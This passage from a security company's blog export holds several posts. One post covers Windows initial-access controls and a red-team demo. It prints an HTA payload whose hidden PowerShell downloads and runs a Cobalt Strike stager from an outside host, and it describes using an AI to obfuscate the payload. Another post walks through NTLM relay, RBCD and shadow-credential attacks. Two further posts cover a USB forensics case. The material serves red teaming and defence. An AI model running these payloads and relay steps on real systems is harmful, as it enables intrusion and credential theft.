remains unchanged since it was signed by the original issuer.\nMicrosoft does not verify the publisher’s identity or the integrity of the code directly. Instead, it relies on a robust Public Key Cryptography (PKI) system which enables a third-party certificate authority, such as Sectigo (formerly Comodo CA), to authenticate the publisher and hash the code.\nimage13 Figure 3: UAC Prompt will notify users in both cases where the publisher is known and unknown.\nWith Microsoft Authenticode, various types of Windows executables and code can be signed, including .exe, .cab, .dll, .ocx, and .xpi files, in both 32-bit and 64-bit user modes.\nAuthenticode certificates are used to verify and hash both software or code developed by a publisher. Although the certificates are issued by Microsoft, the validation and hashing processes are conducted by a trusted certificate authority (CA) like Sectigo. This ensures that the code comes from a verified source and remains unchanged since its release. Unfortunately, it has been discovered that adversaries are abusing signature verification, as discovered by (https://symantec-enterprise-blogs.security.com/threat-intelligence/carderbee-software-supply-chain-certificate-abuse). The APT called Carderbee was able to get Microsoft to digitally sign a type of malware known as a rootkit. To gain that level of access without alerting end-point security systems and other defences, the Carderbee hackers required their rootkit to receive Microsoft approval, which it did after Microsoft signed it.\nApplication Allowlisting and Blocklisting image12 Figure 4: Applocker Popup.\nApplication allowlisting ensures that only authorised software can execute, while blocking all unauthorised software from running on your assets. This prevents malicious or unapproved applications from potentially compromising the system. The application allowlisting software must verify that only authorised software libraries (such as .dll, .ocx, etc.) are permitted to load into system processes. This helps to maintain the integrity of your system by preventing unauthorised code from being injected.\nIn Windows environments, specifically in Active Directory we can utilise group policies, Applocker or something stricter like Windows Defender Application Control to maintain and enforce control policies over applications and binaries.\nMark-Of-The-Web (MOTW) Mark-of-the-Web (MOTW) is a security feature originally introduced in Internet Explorer to ensure that saved web pages and other downloaded files run in the security zone corresponding to their origin. It was accomplished by appending to saved webpages and was later extended to support other file types using Alternate Data Streams (ADS), which is a feature of NTFS file system that dates back to Windows 3.1.\nThis feature allows files to have multiple data streams associated with them, by using the |filename:streamname format. It also applies to MS Office, and other programs by utilising |AttachmentExecuteInterface.\nSo when we have downloaded the file, Internet Explorer creates an ADS named Zone.Identifier and adds a ZoneID to the stream in order to indicate a zone that file comes from.\nIn ADS, we have the following ZoneID values and their representations:\nLocal computer Local intranet Trusted sites Internet Restricted sites image123 Figure 5: ADS created on downloaded file.\nAs we can see in the figure above, all modern Windows platforms that are dealing with downloaded files or attachments will generate a Zone.Identifier in ADS stream, adding URL information such as Referrer and Host information in addition to the zone. This information can be used to enhance antivirus and various endpoint detection and response (EDR) products to aid the reputation checks of the file.\nMark-of-the-Web (MotW) nowadays serves as a barrier to successful phishing attacks by giving users the option to decline execution. It also collaborates with SmartScreen, enabling access to the registered antivirus engine to perform additional checks on signatures and reputation. Nevertheless, adversaries can circumvent these protections as they might deliver a phishing attachment that evades supplementary prompts or inspections.\nAlternatively, they could create a malicious extension that closely resembles legitimate content, tricking victims into inadvertently providing initial access.\nOffice Security Controls image10 Figure 6: Macro security controls.\nMacros have been a favoured initial access method for threat actors since the early days, persisting as one of the longest-enduring challenges in the industry. One notable event was usage of the macro in the Vawtrak malware campaign, discovered in 2014 and was used to spread and steal credentials in the Bank of America attack. Microsoft is trying to battle macro malware by enforcing Mark-of-the-Web (MotW) control on macro-enabled documents. Microsoft’s documentation states:\nVBA macros are a common way for malicious actors to gain access to deploy malware and ransomware. Therefore, to help improve security in Office, we’re changing the default behavior of Office applications to block macros in files from the internet.\nBlocking macros serves a dual purpose: it reduces the potential for attacks and raises the complexity needed to execute them, especially since email remains the primary method for delivering malware.\nimage2 Figure 7: Upon document execution a macro popup will appear.\nTherefore, we can assert that the threat landscape can be divided into Pre-Macro and Post-Macro eras, as threat actors have swiftly adapted by moving away from macro-based malware to utilising utilities such as OneNote files with .one and .onepkg extensions. This shift has been identified by security researchers as a significant evolution in the email threat landscape in recent history. With that in mind, the following section of the post will introduce different techniques that adversaries are employing in order to facilitate initial access and bypass previously mentioned security measures.","initial-access-demo#Initial Access Demo":"To achieve initial access, adversaries often require some form of user interaction to execute their kill-chain. For this blog post, let’s assume that we are the end-user who has received an email link that successfully bypassed email filters (for more on this, see our blog post on automated smuggling techniques by our red team operator Francesco). Alternatively, we could have been coerced by an adversary through SaaS applications like Teams (for details on this method, refer to Max’s IDOR discovery) to download a binary file.\nPlease note, that in this demo, Microsoft Defender was turned off, although normally during engagements, antivirus/EDR bypassing is another process that is undertaken by operators.\nIn this blog post, we are going to use malicious HTA payloads that are being used by adversaries. HTA (HTML Application) is basically an application whose source consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. One caveat with this technique is that it requires Internet Explorer to be installed, otherwise HTA files won’t execute on the target computer. It’s worth noting that it also runs in full trust mode therefore browser security constraints do not apply here.\nDuring execution, it uses mshta.exe which native Windows binary that suits perfectly for modern living of the land ethos and handles further malicious code execution without needing to touch the victims disk. LOLBINS are commonly used by adversaries to execute malicious code and evade EDR/AV solutions as those native binaries are often not picked up given they are used for legitimate sysadmin tasks.\nTo proceed, we are going to use Cobalt Strike, set up teamserver infrastructure with listeners and use Scripted Web Delivery that will generate stageless beacon payload artefacts that will be handled by our malicious HTA application.\nimage1 Figure 8: Configuring a Cobalt Strike Listener and Scripted Web Delivery of our payload.\nAfter that, with truly modern fashion, we are going to politely ask our AI friend to obfuscate it so we can test it out of curiosity against static analysis detection to see how it withstands AV/EDR solutions.\nimage9 Figure 9: Prompt that was used to obfuscate our PowerShell command for our .hta payload\nLet’s compare static analysis detection rates with the non-obfuscated payload, for this we are going to utilise hybrid analysis. This is an excerpt of an example HTA payload below:\n\u003chtml\u003e \u003chead\u003e \u003ctitle\u003eHTA Payload Demo\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003eExample Text\u003c/p\u003e \u003c/body\u003e \u003cscript language=\"VBScript\"\u003e Function demo() Set shell = CreateObject(\"wscript.Shell\") shell.run \"powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.0.7:8088/a'))\"\" End Function demo \u003c/script\u003e \u003c/html\u003e As we can see in the figure above, we can conclude that with little effort, adversaries can increase their sophistication and attempt to evade some of the detections. In our case we don’t need to worry about the AV/EDRs as for demo purposes, we have disabled Windows Defender. But evasion is integrated within the red team craft where we have to tackle each phase of EDR/AV detection, those phases include: Static and Heuristic Analysis, Cloud Reputation Analysis, Sandboxing , Machine Learning Analysis, Emulation and Behavioural Analysis.\nFor this reason, there are different cyber kill chains, where in order to evade detection of our HTA payload, we could perhaps use ISO containerisation techniques that would evade Mark-of-the-Web, then use HTML smuggling to fly past phishing detections. Then we could utilise a LNK technique, to trick the end-user into clicking our executable that has fully customised shellcode which is additionally loaded using DLL sideloading of legitimate running process. This just shows how complex implementing new undetectable payloads could be, and how many layers of defences have to be taken into consideration.\nBack to our initial access demo, now that we have our HTA application on the target machine, let’s execute it. What will happen in the background is that our powershell code embedded within that HTA application will fetch our Cobalt Strike stager hosted on our teamserver.\nimage6 Figure 11: Execution of the .hta payload and visible .mshta as “HTML Application Host”\nimage11 Figure 12: Connection was established as can be seen by our beacon that was executed via the HTA payload.\nAs demonstrated in the figure above, we have successfully established a connection to our victims’ host. From this point forward, we can interact with the beacon, marking just the beginning of our red team engagement. The real challenge lies ahead as we delve into persistence, privilege escalation, lateral movement, and pivoting all of which are significant undertakings given the capabilities of current EDR and AV solutions to emulate real-world adversaries and their techniques.","initial-access-prevention-strategies#Initial Access Prevention Strategies":"There are several prevention strategies we recommend implementing, as there is no one-size-fits-all solution due to factors such as complex infrastructure setups, data collection and correlation challenges.\nHowever, we have found that having a robust AV/EDR solution, along with effective patch management, by keeping machines patched and up-to-date against n-day exploits is crucial. Additionally, tightening group policies makes it more difficult for adversaries to navigate and pivot within the network, thereby containing the threat and minimising the “blast radius.” Implementing email filters with appropriate thresholds and spam rules is also highly recommended, complementing secure mail configurations for protocols like IMAP, SMTP, or POP.\nFurthermore, protecting SaaS applications such as Teams, SharePoint, Exchange Online, or OneDrive through regular configuration reviews is crucial, as these platforms are often targeted for initial access.\nThank you for taking the time to read this blog. I hope you found it informative and enjoyable. Stay tuned for more of our upcoming blog posts and advisories.","references#References":" https://www.gironsec.com/blog/2020/12/bypassing-windows-smartscreen/ https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/ https://mgeeky.tech/warcon-2022-modern-initial-access-and-evasion-tactics/ https://www.gov.uk/government/statistics/cyber-security-breaches-survey-2024/cyber-security-breaches-survey-2024 https://www.techradar.com/pro/security/microsoft-smartscreen-vulnerability-can-be-abused-to-deploy-malware-and-its-happening-in-the-wild https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence ","what-prevents-initial-access#What prevents Initial Access?":""},"title":"Adversary at the Door - Initial Access and what's currently on the menu"},"/articles/2024/08/2024-08-28-building-forensic-expertise-a-two-part-guide-to-investigating-a-malicious-usb-device-part-1/":{"data":{"":"","#":"JUMPSEC believes heavily in learning and developing through real world experience. The incident described in this blog post presented a fantastic opportunity for 3 junior team members to learn first hand how to conduct, report and respond to an incident investigation. This blog post is split into two parts: Part I focuses on the prerequisites and preparation work done before kicking off the investigation, such as explaining the forensic principles used in the investigation, how the evidence is preserved and introducing tools deployed. Part 2 emphasises on how we utilise the tools to conduct the investigation and how we assemble all the available evidence to conclude the investigation.\nImagine, you come into work one morning to find a mysterious USB drive on your desk. It’s not addressed to anyone in particular and no note is left to explain its origin. What would you do?\n1 2 The suspicious USB\nThis is what happened to an organisation early this year. To conduct an investigation into the mystery USB drive they contacted JUMPSEC!\nIn this blogpost, we walk you through a real case of an unexpected USB drive mailed in to an organisation, showing the step-by-step process of how a Digital Forensics and Incident Response (DFIR) investigation was carried out, what principles and tools were used, and the perspectives from three rookies in the cyber security field doing their first investigation!\nThis is how it all began….\nPreparation 3 Before the start of the investigation, we caught up on the Association of Chief Police Officers (ACPO) Principles of Digital Based Evidence[1]. It provides guidance not only to assist law enforcement but anyone performing forensic investigations involving digital evidence. It’s widely used by practitioners operating in the digital forensics field in England and Wales.\nThere are 4 principles:\nPrinciple 1: No action taken by law enforcement agencies, persons employed within those agencies or their agents should change data which may subsequently be relied upon in court. Principle 2: In circumstances where a person finds it necessary to access original data, that person must be competent to do so and be able to give evidence explaining the relevance and the implications of their actions. Principle 3: An audit trail or other record of all processes applied to digital evidence should be created and preserved. An independent third party should be able to examine those processes and achieve the same result. Principle 4: The person in charge of the investigation has overall responsibility for ensuring that the law and these principles are adhered to. Initially we did not grasp how these were practically applied in performing the investigation. To put them into a more practical perspective, these are actions we took that directly relate to each of the principles:\n4 Write Blocker\nObtained a Write Blocker. Write Blocker is a tool that prevents all computer storage media connected to a computer from being written to or modified, allowing us to make a bit-by-bit copy of the data in the USB drive without tempering it (Principle 1) Organised an investigation team where senior members with extensive experience handling DFIR investigations would be participate in the investigation (Principle 2) Assigned a designated place to store the USB drive and relevant evidence securely where only authorised people can access, and prepared the necessary tools for recording all processes (Principle 3) Assigned a lead investigator to be in charge of the investigation and ensured that the investigation would be carried out in accordance to the principles. (Principle 4) Emilia was appointed to be the lead investigator. A lead investigator is an important role, they coordinate evidence acquisition, making sure the investigation is progressing, and ensuring the stakeholders involved are kept informed.\nAs the lead investigator learnt a great deal and the responsibilities included:\nKeeping an audit trail of and preserving evidence Ensuring the analysis was documented appropriately Sending out updates to inform the client the process of the investigation and make sure everyone in the team was updated with the current status Producing the final investigation report Despite she’d only recently started doing investigation training exercises, the lead responder was very excited to take on a new challenge of being the lead investigator. As the team knew more about how an investigation was supposed to carry out with the help of other more experienced team members, the investigation became more and more enjoyable.\nNow everything was ready and we were set to begin our first ever journey of an incident investigation!\n5 Preserving Evidence: Documentation and Isolation Once we’d completed scoping the incident and verified we had the appropriate equipment we waited patiently for the USB drive to arrive. Once the USB arrived we were so excited and couldn’t wait to start plugging the USB drive into the Write Blocker to see what was inside, but we held off in order to document everything from the moment we received it as it is important to leave an audit trail for any DFIR investigations. Otherwise the integrity of the evidence cannot be guaranteed and as a result, the evidence will not be accepted in court in occasions where legal involvement is required. (Principal 3)\nSo we documented everything. By everything, we meant everything. This involved taking close-up photographs of the envelope the USB drive arrived in and the letter attached, capturing any markings or labels on the drive itself, and noting details like its brand and size. The reason for doing so is because every piece of information, despite seemingly insignificant, could hold value later in the investigation.\nWe also started building a chain of custody, by recording every individual who handled the USB drive, the date, time and location of each transfer, and the purpose for the transfer. (Principal 3)\nConfiguring a Safe Investigation Environment Before dissecting what was inside the USB drive, since we assumed the USB drive was malicious as its origin was unknown and we defintely didn’t want to perform another incident investigation later on on one of our own devices as well. So instead of analysing the USB drive in an actual device and risking our device to get infected by the potentially malicious content, we decided to carry out the analysis in a virtual machine.\nVirtual machine (VMware in this case) is an emulation of a computer system and provides the functionality of a physical computer. It creates an isolated environment and ensures any malicious content on the USB drive is contained within the virtual machine, safeguarding our primary system from potential infection.\nIn the next part, we will show how to set up a virtual machine and what details need particular attention, and we will continue the investigation from there!\nReference [1] ACPO, ACPO Good Practice Guide for Digital Evidence Available at: https://www.digital-detective.net/digital-forensics-documents/ACPO_Good_Practice_Guide_for_Digital_Evidence_v5.pdf (Accessed: 6 August2024), (2012) .\nDisclaimer The incident response case described in this blog is based on a real event. However, specific details, including the names, locations, and other identifying information of the organisation involved, have been altered to protect their privacy and confidentiality. Any resemblance to actual events or entities is purely coincidental."},"title":"Building Forensic Expertise: A Two-Part Guide to Investigating a Malicious USB Device (Part 1)"},"/articles/2024/09/2024-09-11-building-forensic-expertise-a-two-part-guide-to-investigating-a-malicious-usb-device-part-2/":{"data":{"":"","#":"In this part 2, we’ll walk you through the step-by-step process of setting up and conducting a Digital Forensics and Incident Response (DFIR) investigation using a virtual machine (VM). We’ll cover everything from configuring the VM to ensure it’s completely isolated to tackling the challenges of USB passthrough with a write blocker. You’ll also learn about the risks of using public threat intelligence platforms like VirusTotal and discover alternative methods for secure file analysis.\nOur goal is to share practical experiences and lessons learned from our investigation, offering useful insights and tips for anyone new to the field or looking to refine their DFIR skills. Whether you’re a seasoned pro or just starting out, this article provides a clear and detailed look at best practices and important considerations in digital forensics and incident response.\n1 Setting Up the Virtual Machine Muhammad was responsible for continuing the investigation by extracting data from the USB stick using a write blocker and a virtual machine.\nSetting up the VM for this DFIR investigation is mostly straightforward, thanks to prior experience with virtual machines. We used VMware Workstation Pro with a Windows 11 environment. However, there were some challenges.\nWe configured the VM to block data transfer between the VM and the host system with the detailed steps below. This step is crucial for preventing data leaks, preventing malware from spreading. It protects against accidental data leaks and tampering of the evidence, ensuring the integrity of the investigation by segregation the Virtual Machine environment from the host environment.\nTo achieve this, disable shared folders and other options that could potentially allow data exchange between the VM and the host. Here’s how to do it:\n1. Disable Shared Folders:\nGo to the VM settings. Navigate to the “Options” tab. Select “Shared Folders” and set it to “Disabled.” 2 2. Disable Drag-and-Drop and Copy-Paste:\nStill under the “Options” tab, select “Guest Isolation.” Uncheck both “Enable drag and drop” and “Enable copy and paste.” 3 Additionally, disable the VM’s internet connection to ensure the VM is not connected to the internet. This precaution was necessary since the contents of the USB were unknown, and wanted to prevent any potential malicious activity from communicating with external networks. To achieve this the following steps should be followed\n3. Disable the internet in VMware Workstation\nRight-click the VM and select Settings. Go to the Hardware tab and select Network Adapter. Uncheck “Connected” and “Connect at power on”. 4 USB Passthrough and Write Blocker Integration Getting USB passthrough to work with the write blocker presented its own set of challenges. Initially, when we connected the USB to the write blocker and passed it through to the VM, there was no response from the virtual machine. After some troubleshooting, discovered that we needed to adjust the USB settings within VMware Workstation Pro to ensure proper recognition of the device.\nHere’s how to do it:\nAdjust USB Compatibility: In the VM settings, navigate to the “USB Controller” option. Set the “USB compatibility” to USB 2.0 or 3.0, depending on the write blocker’s compatibility. Enable “Show all USB input devices” to ensure the VM detects the write blocker. Manually Connect the USB Device: After booting the VM, go to the “VM” menu in VMware Workstation. Select “Removable Devices,” then find the USB device, and click “Connect (Disconnect from Host).” This action passes the USB device directly to the VM, bypassing the host system. These steps were essential in ensuring that the USB device was correctly recognized by the VM through the write blocker, allowing us to proceed with the forensic analysis.\n5 Integrating the Write Blocker The integration of the write blocker was a critical step in ensuring that the data on the USB drive remained unaltered during the investigation. We used AccessData FTK Imager for this task, a trusted tool in the DFIR community for acquiring and analysing digital evidence. The write blocker was necessary to prevent any accidental writes or modifications to the USB drive, which could compromise the integrity of the evidence.\n6 A challenge that we faced was ensuring that the write blocker was properly connected and recognized by both the VM and FTK Imager. This required carefully following the correct sequence of connections: first plugging the USB into the write blocker, then connecting the write blocker to the host machine, and finally configuring the VM to recognize the USB device as described earlier.\nThreat Intelligence Research Marin was responsible for researching the data collected from the USB (file hashes) through various threat intelligence platforms.\n7 Here, we’ll learn about the risks of uploading files to VirusTotal and explore alternative analysis methods. Uploading files to VirusTotal can be risky because this popular threat intelligence platform is public, meaning that any files you upload and their analysis results can be seen and downloaded by users with premium VT subscriptions - from cybersecurity professionals to researchers and even malicious threat actors. This visibility could unintentionally expose sensitive information or proprietary data. If the files are unique to your organisation, uploading them could alert adversaries to potential vulnerabilities or ongoing investigations, compromising your security measures.\nPotential Risks:\nExposure of Sensitive Data: Uploading files with confidential information to VirusTotal can lead to unintended disclosure. Intellectual Property Theft: Other companies or competitors might reverse-engineer proprietary software or unique data structures. Targeted Attacks: Malicious threat actors monitoring VirusTotal could use the information to launch targeted attacks against your organisation. Legal and Compliance Issues: Uploading certain files might breach data protection regulations and policies. To avoid these risks, we considered alternative methods for analysing files. One effective approach is using private sandbox environments. Sandboxing means running files in an isolated, controlled setting to observe their behaviour without risking the security of your broader network. This method allows for a thorough analysis of potential threats while keeping sensitive data secure and under control.\nOne sandboxing option is FLARE VM, a collection of software installed on top of Windows VM. Once running some flare vm script to install tools, it will allow you to maintain a reverse engineering environment on a VM, for malware analysis, incident response, and forensic analysis.\n8 Importance of Private Sandboxing:\nConfidentiality: Keeps sensitive files and analysis results within your organisation. Customization: You can tailor the sandbox environment to closely mimic your actual network, providing more relevant insights. In-Depth Analysis: Allows for detailed behavioural analysis of files, uncovering sophisticated or previously unknown threats that simple hash comparisons might miss. Another way to mitigate risk is by testing the hash of a file instead of uploading the entire file. A hash generates a unique identifier representing the file’s contents without revealing the actual data, allowing for secure and private verification against known threat databases.\nBenefits of Testing Hashes:\nPrivacy Preservation: Hashes don’t expose the actual file content, maintaining confidentiality. Efficiency: Comparing hashes is less computationally intensive than analysing full files. Integrity Verification: Hashes confirm that files haven’t been altered, ensuring data integrity. SHA-256, which stands for Secure Hash Algorithm 256-bit, is a cryptographic hash function that produces a fixed-size, 256-bit hash value from an input of any size. The use of a hash varies depending on the scenario; it can be used to confirm whether the content of two files is identical, or in this case, whether the file the hash belongs to has been reported as malicious previously, and to check the file’s originality by comparing the hash against threat intelligence platforms, such as VirusTotal.\nThe good news was that the SHA-256 hashes did not match any known malicious files in VirusTotal’s extensive database, but we still couldn’t determine its origin. Despite this initial relief, we conducted further analysis to ensure the files were safe.\nFurther Investigation: Antivirus Scan Next, we ran an antivirus scan and a static analysis on the files. Both analyses aimed to ensure the files were not malicious. Antivirus scans look for patterns based on the signatures or definitions of known malware, while static analysis involves examining the code without executing the program. This method helps identify potential threats by analysing the file structure and content.\nThe antivirus scan didn’t discover any indications of infection and confirmed that the files did not contain any malicious features. The results of the static analysis echoed that.\nBy now, the files appeared to be non-malicious, so we could finally open them to see what they actually were!\nFinal Investigation: Examining the Files’ Content Voila! Guess what the content of the files was? They were… two different files! :)\nSince we aim to share knowledge applicable to general scenarios, we won’t dive into specifics here. However, a general rule of thumb to determine if the content is malicious (especially after running scans like antivirus and static analysis with no concerning results) is to understand what might be expected or unexpected for the client, and whether phishing could be a possible threat based on the content. That was the approach we used for examining the files’ content.\nFor example, a company might expect an email with remittance details from its supplier. This is relevant to the company and involves potential risks, such as when someone impersonating the supplier sends an email that appears to be remittance-related, embedding a link that supposedly directs you to a remittance document, but instead leads to a phishing page designed to deceive you into entering your credentials.\nThe two files appeared to be related to a project the client was working on at that moment. The information and tone of language used in the files suggested the sender was purely offering their advice on the project. Although it wasn’t something the client was expecting, we believed we had identified the origin and purpose of the USB drive.\n9 Verdict: A Clean Bill of Health At this point, we’d conducted several analyses, and by piecing all the results together, we concluded that the USB drive was not malicious. If it had been a computer that needed investigating, we would have also analysed unusual registry entries or network connections to known malicious servers.\nThroughout the entire investigation, we kept the client in the loop, informing them of the process at each stage. Clear communication is essential in any DFIR investigation, and clients might also provide valuable information that could assist the investigation.\nKey Takeaways and Lessons Learned\nAlthough the files on the USB drive were not malicious—which was definitely a relief—we still gained valuable experience by conducting an incident investigation from start to finish, all under the guidance of an experienced team. As rookies, we learned how to preserve evidence in line with best practices, utilise various tools, leverage threat intelligence, and maintain a proper chain of custody to draw meaningful conclusions.\nThrough this process, we discovered several critical lessons:\nImportance of Isolation: Isolating the VM from the host system and external networks is crucial when handling unknown devices. This step prevents potential contamination or compromise of the main system. Attention to Detail in Settings: Correctly configuring the VM and USB passthrough settings is essential. Small oversights can lead to significant delays or even jeopardise the investigation. Familiarity with Tools: Being well-versed with forensic tools like FTK Imager and knowing how to use a write blocker properly can significantly enhance the efficiency and accuracy of the investigation. Advice for Beginners For anyone attempting this process for the first time, here are some tips:\nDouble-Check VM Settings: Before starting your investigation, make sure to disable any features that allow data exchange between your VM and the host system, and disconnect the VM from the internet. USB Passthrough Troubleshooting: If your USB device isn’t being recognized, check the USB compatibility settings in your VM. Also, manually connect the USB device through the VMware menu to ensure proper passthrough. Understand Your Tools: Take the time to familiarise yourself with both the write blocker and the forensic tools you’re using. This knowledge will help you avoid mistakes that could compromise your investigation. Stay Patient and Methodical: DFIR work requires a lot of patience and attention to detail. Rushing through steps or skipping checks can lead to errors that are difficult to correct later on. All of these experiences broadened our horizons and provided a better understanding of the DFIR world, which will definitely benefit us in the long term. We hope this article provided some insights, especially for those interested in cybersecurity or someone who, like us, is just starting their career in the field. We also hope you enjoyed the read as much as we enjoyed our first investigation! :)\nDisclaimer: The incident response case described in this blog is based on a real event. However, specific details, including the names, locations, and other identifying information of the organisation involved, have been altered to protect their privacy and confidentiality. Any resemblance to actual events or entities is purely coincidental."},"title":"Building Forensic Expertise: A Two-Part Guide to Investigating a Malicious USB Device (Part 2)"},"/articles/2024/09/2024-09-17-ntlm-relaying-making-the-old-new-again/":{"data":{"":"","#":" davesbloggie I am old enough to remember that it was not always possible to get domain admin within the first hour of a test via Active Directory Certificate Services (ADCS) misconfigurations or over permissioned SCCM NAA accounts. At present we are spoilt for choice in regards to privilege escalation vectors within the on-premise AD environment’s, but I wanted to take a look at some of the other misconfigurations that proved to be fruitful before the advent of ADCS and SCCM and continue to land me quick wins on engagements, such as:\nLack of SMB signing Lack of LDAP signing and/or channel binding Machine Account Quota \u003e 0 NTLM relaying The undelaying exploits are not new here, only the old revisited, but just maybe some of the modern techniques for abusing them have slipped your mind in the rush to abuse ESC1. These techniques should be part of your on-premise AD toolkit, so let’s jump into the details.\nBelow is a diagram of my very basic KENNEDY.local home domain setup consisting of:\n1x Windows Server acting as Domain Controller: KENNEDY-DC (192.168.0.137) 1x Windows Server acting as Certificate Authority: KENNEDY-CA (192.168.0.84) 1x Windows 10 Workstation: ELISH (192.168.0.99) 1x Kali VM acting as Attacker (192.168.0.203) 1 The users will be:\njkennedy (standard domain user) ekennedy (administrative user) Lack of SMB Signing Nothing illustrates the power of the SMB signing vulnerability quite like LNK files placed on shares. My favourite tool for demonstrating this, is the ‘slinky’ module on ‘nxc’.\nYou can build up a list of all the machines with SMB signing as ‘false’ with the following command:\nnxc smb targets.txt --gen-relay-list nosigning.txt But in my small lab I can just manually check the machines like so:\n2 1 We can see above that the ELISH machine has no signing so it won’t be able to identify for sure who is authenticating to it over the SMB protocol.\nWith that in mind we first use nxc to analyse the KENNEDY-CA machine to see if we have any available writable directories for us to place our LNK file and it identifies the ‘share’ directory:\n3 1 We then use slinky to create a LNK file on this share which points back to our Kali VM 192.168.0.203. Now when anyone enters that share via file explorer (not command line) and without even clicking it the LNK file will be triggered and their authentication will be sent back to the attackers Kali machine.\n4 1 Back at the attackers Kali machine we set up a ntlmrelayx listener for any authentications coming in and, if any are received, we target the 192.168.0.99 machine where we know signing is disabled. At that point ntlmrelayx can automatically open a socks connection with that machine as the user who entered the share using their authentication. We are essentially carrying out a man in the middle attack.\n5 1 When the authentication comes in after ‘ekennedy’ enters the share, we get a hit, and a socks connection is opened with the 192.168.0.99 machine that has no signing as shown:\n6 1 A persistent socks connection is then maintained within ntlmrelayx which is visible when you enter the ‘socks’ command as shown:\n7 1 We can then edit our proxychains configuration file to allow us to access this socks connection to the remote machine, which uses port 1080 by default:\nIn ‘/etc/proxychains4.conf’ add the line “socks4 127.0.0.1 1080”\nNow using proxychains we can dump the sam data given that the ‘ekennedy’ authentication was of an Administrator. It should be noted we don’t need a password at this point using nxc, given we are using a live socks tunnel which has already been authenticated over NTLM.\n8 2 Taking complete control of this machine is now trivial with the hashes received. In the above scenario, ntlmrelayx was used to relay the ‘ekennedy’ admin authentication to just 1 machine but in practice it could relay it to 50 machines with SMB signing off, therefore opening up 50 admin socks connections to pick and choose from.\nThis most certainly has happened to me on a real test.\nNext up are 2 techniques that rely less on luck, especially if you are impatient waiting for someone to trigger a LNK file.\nLDAP Signing - RBCD Similar to SMB signing, LDAP signing - or the lack there of - allows attackers to send HTTP authentication to the LDAP service available on a Domain Controller (DC) but, because signing is disabled, the DC is unable to verify that the authentication coming in is from the actual machine that sent it. This, once again, opens up the possibility of MiTM attacks.\nFirst we check the ‘KENNEDY-DC’ machine to see if LDAP signing or channel binding is enforced, which it isn’t.\n9 We then search for a machine that has a WebClient running on the network using nxc’s ‘webdav’ module as shown below, and we can see that the ‘KENNEDY-CA’ machine has it enabled. Why are we interested in webdav? Well, we can coerce the WebClient service to authenticate back to us over HTTP:\n10 From our attacker’s Kali machine, we now launch ntlmrelayx to target LDAPS of ‘KENNEDY-DC’ and when doing so to use the the ‘delegate access’ flag to launch a RBCD attack on that machine.\n11 In simple terms what delegate access does is create a new machine on the network and gives the new machine permissions over the machine whose authentication we have passed to the DC. These permissions allow us, as the attacker, to impersonate anyone else on the machine (e.g. an administrator).\nTo now force the WebClient to authenticate to ntlmrelayx, we first launch Responder. Ensure its HTTP and SMB servers are turned off, as we don’t want to catch the authentication with this tool but instead using ntlmrelayx.\n12 The only reason we use Responder is to provide us with a ‘Machine Name’ on the network that we can use to advertise itself and receive authentications into our Kali machine. This machine name can be seen below:\n13 We now coerce the ‘KENNEDY-CA’ (192.168.0.84) machine to authenticate to our attacker Kali Responder machine over HTTP, then relay that authentication to ‘KENNEDY-DC’, which will be unable to verify who is authenticating to it. The call back to our Responder machine instead hits our ntlmrelayx server, listening on port 80:\n14 After executing that command, ntlmrelayx forwards the authentication to ‘KENNEDY-DC’ with LDAP signing disabled, and we receive a new machine on the network with a random name, called ‘KQCLXPVT$’. This new machine will also present added information required to impersonate users on the ‘KENNEDY-CA’ server.\n15 This new machine can now be seen in Active Directory as shown:\n16 Using the module named ‘group-mem’ that I wrote for nxc we can now see who we would like to impersonate by looking up the privileged ‘Domain Admins’ members:\n17 After choosing ‘ekennedy’ we can now impersonate them by using our new machine account username and password via the getST.py command from impacket.\n18 This will provide us an ‘ekennedy’ service ticket (a.k.a. silver ticket) for the cifs service on that specific machine, which can’t be used elsewhere.\nWe can import this into our Kali memory as so:\n19 We can then use this ticket in various tools by specifying the ‘-k’ flag on the command line, so it will grab the ticket directly from that KRB5CCNAME variable we set.\nHere I use secretsdump to now dump the hashes from the machines memory which, like passwords, we can use to access the machine as an Administrator, for example:\n20 LDAP Signing - Shadow Credentials This technique is very very similar to the previous one so I will cover it in less detail. The key benefit to using this one is that it isn’t reliant on creating a new machine on the network, which can be useful when some organisations have the ‘Machine Account Quota’ set to zero. Remember that, by default, regular AD users are allowed to add 10, which is crazy!\nThis technique allows an attacker to take over an AD computer account if we can modify the computer’s attribute ‘msDS-KeyCredentialLink’ and append it with alternate credentials in the form of a certificate which we have control over. This certificate will then allow us to have control over that machine.\nSo once again we set up our trusty ntlmrelayx to target ‘KENNEDY-DC’ with no LDAP signing in place but specifying two different flags. They are shadow credentials to tell it what attack we are doing, then a shadow-target to specify the machine we are targeting. The machine we are targeting in this case is again the ‘KENNEDY-CA’ machine with the WebClient running, so we can coerce it towards us as shown previously.\n22 We again use Responder to provide a machine name and PetitPotam to carry out the coercion back to us as shown:\n23 Once again ntlmrelayx gets a hit but this time instead of being able to impersonate anybody else on the victim machine we receive a certificate for the machine account.\n24 Quite handily above, ntlmrelayx provides the command to use next with the tool gettgtpkinit.py to convert the certificate into a TGT (Ticket Granting Ticket) for the machine. A TGT is just as good as a username and password in the Kerberos world so we can use that to act as the machine we are attacking.\nAfter running that command the TGT is saved to file:\n25 Once again we import it into our variable to be used by our tools:\n26 Then once again run secretsdump with the ‘-k’ flag to use the TGT to dump all the hashes of the machine, allowing us a complete takeover.\n27 Well, that completes my little foray into some of the older adversary techniques that have helped me compromise countless Active Directory environments. Whilst older, these are still very real-world and usable attack paths so hopefully this provides the testers out there with some added insights and the defenders with some visibility over attack paths adversaries may take in their Active Directory domains.\nSome remediation steps that you can take to hinder these attacks in your domain are:\nEnabling SMB signing Enabling LDAP signing Set the ‘Machine Account Quota’ to zero Try to move away from NTLM to Kerberos Until next time."},"title":"NTLM Relaying - Making the Old New Again"},"/articles/2024/10/2024-10-15-active-cyber-defence-taking-back-control/":{"data":{"":"","an-unfair-advantage#An unfair advantage":"","no-more-tears-formula#\u0026ldquo;No more tears\u0026rdquo; formula":"Every good cybersecurity article needs a Sun Tzu quote, here is one lesser known quote from Sun Tzu to start us off.\n1 What Happened? Recently, JUMPSEC’s Detection and Response Team (DART) caught a Red Team inside one of our MxDR clients’ networks using a honeypot server. The honeypot server was set up using Thinkst Applied Research’s project 